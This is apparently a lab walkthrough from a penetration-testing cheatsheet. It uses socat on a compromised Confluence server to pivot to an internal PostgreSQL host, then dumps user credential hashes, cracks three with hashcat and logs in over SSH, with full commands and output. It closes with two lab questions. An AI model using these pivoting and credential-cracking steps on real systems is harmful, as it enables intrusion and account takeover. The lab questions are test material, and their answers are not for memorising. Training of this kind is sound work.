# Port Forwarding with Socat

The way we expect our port forward to work
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Port-Forwarding-with-Socat-1.png)

Running the Socat port forward command
>``` shell
>confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
>
># ========== Expected Result ==========
><ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
>2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
>2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
>2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
>2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
>2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
>2022/08/18 10:12:01 socat[46589] I starting accept loop
>2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
># =====================================
>```

Socat in place as our port forwarder
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Port-Forwarding-with-Socat-2.png)

Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward
>``` shell
>kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
>
># ========== Expected Result ==========
>Password for user postgres: 
>psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
>SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
>Type "help" for help.
># =====================================
>
>postgres=# \l
>
># ========== Expected Result ==========
>                                  List of databases
>    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
>------------+----------+----------+-------------+-------------+-----------------------
> confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
> postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
> template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
>            |          |          |             |             | postgres=CTc/postgres
> template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
>            |          |          |             |             | postgres=CTc/postgres
>(4 rows)
># =====================================
>```

The contents of the cwd_user table in the confluence database
>``` shell
>postgres=# \c confluence
>
># ========== Expected Result ==========
>psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
>SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
>You are now connected to database "confluence" as user "postgres".
># =====================================
>
>confluence=# select * from cwd_user;
>
># ========== Expected Result ==========
>   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
>---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
>  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
> 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
> 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
> 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
> 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
> 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
>(6 rows)
>
>(END)
># =====================================
>```

Hashcat having cracked the database_admin, hr_admin and rdp_admin account hashes
>``` shell
>kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
>
># ========== Expected Result ==========
>hashcat (v6.2.5) starting
>
>OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
>=====================================================================================================================================
>* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU
>
>Minimum password length supported by kernel: 0
>Maximum password length supported by kernel: 256
>
>...
>
>{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
>{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
>{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
>...
># =====================================
>```

Creating a new port forward with Socat to access the SSH service on PGDATABASE01
>``` shell
>confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
>
># ========== Expected Result ==========
></bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 
># =====================================
>```

Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Port-Forwarding-with-Socat-3.png)

Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01
>``` shell
>kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
>
># ========== Expected Result ==========
>The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
>ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
>This key is not known by any other names
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
>database_admin@192.168.50.63's password: 
>Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
>
> * Documentation:  https://help.ubuntu.com
> * Management:     https://landscape.canonical.com
> * Support:        https://ubuntu.com/advantage
>
>  System information as of Thu 18 Aug 2022 11:43:07 AM UTC
>
>  System load:  0.1               Processes:               241
>  Usage of /:   59.3% of 7.77GB   Users logged in:         1
>  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
>  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215
>
>
>0 updates can be applied immediately.
>
>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
>
>The programs included with the Ubuntu system are free software;
>the exact distribution terms for each program are described in the
>individual files in /usr/share/doc/*/copyright.
>
>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
>applicable law.
>
>database_admin@pgdatabase01:~$
># =====================================
>```

Lab 1 - Follow the steps in this section to set up a port forward and gain access to the confluence database on PGDATABASE01 using psql from your Kali machine. Crack the password of the database_admin user. What is the plain text password of this account?
>``` shell
>
>```
>

Lab 2 - Capstone Lab: Use the password found in the previous question to create a new port forward on CONFLUENCE01 and gain SSH access to PGDATABASE01 as the database_admin user. What's the value of the flag found in /tmp/socat_flag on PGDATABASE01?
>``` shell
>
>```
>
